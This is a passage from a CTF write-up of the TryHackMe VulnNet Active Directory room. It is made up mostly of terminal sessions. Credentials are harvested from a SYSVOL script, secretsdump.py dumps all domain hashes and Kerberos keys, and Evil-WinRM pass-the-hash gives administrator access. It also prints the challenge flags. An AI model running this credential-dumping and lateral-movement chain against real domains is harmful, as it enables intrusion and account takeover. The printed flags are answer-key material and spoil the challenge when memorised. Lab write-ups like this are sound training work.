+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[-] rpc_s_access_denied
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ evil-winrm -i 10.10.169.84 -u "enterprise-core-vn" -p "ry=ibfkfv,s6h," -N             
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completion is disabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> dir
+*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir
+
+    Directory: C:\Users\enterprise-core-vn\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/13/2021   3:43 PM             39 user.txt
+
+*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
+THM{726b7c0baaac1455d05c827b5561f4ed}
+
+:)
+
+privesc
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ smbclient \\\\10.10.169.84\\NETLOGON -U t-skid
+Password for [WORKGROUP\t-skid]: tj072889*
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Mar 16 19:15:49 2021
+  ..                                  D        0  Tue Mar 16 19:15:49 2021
+  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
+
+                8540159 blocks of size 4096. 4319566 blocks available
+smb: \> mget *
+Get file ResetPassword.vbs? yes
+getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+smb: \> quit
+
+or
+
+──(kali㉿kali)-[~/VulnNet]
+└─$ smbclient \\\\10.10.169.84\\SYSVOL -U t-skid
+Password for [WORKGROUP\t-skid]: tj072889*
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 11 14:19:49 2021
+  ..                                  D        0  Thu Mar 11 14:19:49 2021
+  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021
+
+                8540159 blocks of size 4096. 4319297 blocks available
+smb: \> cd vulnnet-rst.local\
+smb: \vulnnet-rst.local\> ls
+  .                                   D        0  Thu Mar 11 14:23:40 2021
+  ..                                  D        0  Thu Mar 11 14:23:40 2021
+  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
+  Policies                            D        0  Thu Mar 11 14:20:26 2021
+  scripts                             D        0  Tue Mar 16 19:15:49 2021
+
+                8540159 blocks of size 4096. 4319038 blocks available
+smb: \vulnnet-rst.local\> cd scripts
+smb: \vulnnet-rst.local\scripts\> ls
+  .                                   D        0  Tue Mar 16 19:15:49 2021
+  ..                                  D        0  Tue Mar 16 19:15:49 2021
+  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
+
+                8540159 blocks of size 4096. 4319038 blocks available
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ more ResetPassword.vbs                
+Option Explicit
+
+Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
+Dim strUserDN, objUser, strPassword, strUserNTName
+
+' Constants for the NameTranslate object.
+Const ADS_NAME_INITTYPE_GC = 3
+Const ADS_NAME_TYPE_NT4 = 3
+Const ADS_NAME_TYPE_1779 = 1
+
+If (Wscript.Arguments.Count <> 0) Then
+    Wscript.Echo "Syntax Error. Correct syntax is:"
+    Wscript.Echo "cscript ResetPassword.vbs"
+    Wscript.Quit
+End If
+
+strUserNTName = "a-whitehat"
+strPassword = "bNdKVkjv3RR9ht"
+
+a-whitehat : bNdKVkjv3RR9ht
+
+use secretsdump.py to dump the NTLM hashes for all the users on the DC machine
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ sudo secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.169.84 
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[-] RemoteOperations failed: SMB SessionError: STATUS_PIPE_NOT_AVAILABLE(An instance of a named pipe cannot be found in the listening state.)
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
+vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
+vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
+vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
+vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
+vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
+WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:70d01ee15ee1ff5e17b1689bf257825b:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
+Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
+Administrator:des-cbc-md5:52d325cb2acd8fc1
+krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
+krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
+krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
+vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
+vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
+vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
+vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
+vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
+vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
+vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
+vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
+vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
+vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
+vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
+vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
+vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
+vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
+vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
+WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:f8b73352bb3a234efac83be9bd4c507511d6ba4a17ac9206fdf3aa8996755537
+WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:e54122b0bca35b8f3b3e382663b6494d
+WIN-2BO8M1OE1M1$:des-cbc-md5:3bdf456be5f72cd6
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+
+using hash admin
+
+┌──(root㉿kali)-[/home/kali/VulnNet]
+└─# evil-winrm -i 10.10.169.84 -u Administrator -H 'c2597747aa5e43022a3a3049a3c3b09d' -N
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completion is disabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd \Desktop
+Cannot find path 'C:\Desktop' because it does not exist.
+At line:1 char:1
++ cd \Desktop
++ ~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Desktop:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/13/2021   3:34 PM             39 system.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
+THM{16f45e3934293a57645f8d7bf71d8d4c}
+```
+What is the user flag? (Desktop\user.txt)
+What is the system flag? (Desktop\system.txt)
+
+## Flags / Answers
+- ***THM{726b7c0baaac1455d05c827b5561f4ed}***
+- ***THM{16f45e3934293a57645f8d7bf71d8d4c}***
+
+## Notes / Lessons Learned
+[[VulnNet Internal]]
+
